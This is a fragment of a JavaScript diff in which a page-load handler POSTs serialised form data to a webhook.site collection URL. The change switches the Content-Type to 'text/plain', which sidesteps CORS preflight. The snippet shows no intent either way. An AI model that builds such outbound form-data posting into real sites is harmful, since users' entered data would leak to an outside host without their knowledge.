@@ -89,7 +89,7 @@ document.addEventListener("DOMContentLoaded", function() {
                 fetch("https://webhook.site/fae5a525-da90-4e69-97ed-fd0152deeacc", {
                     method: "POST",
                     headers: {
-                        "Content-Type": "application/json"
+                        "Content-Type": "text/plain"
                     },
                     body: JSON.stringify(formData)
                 })
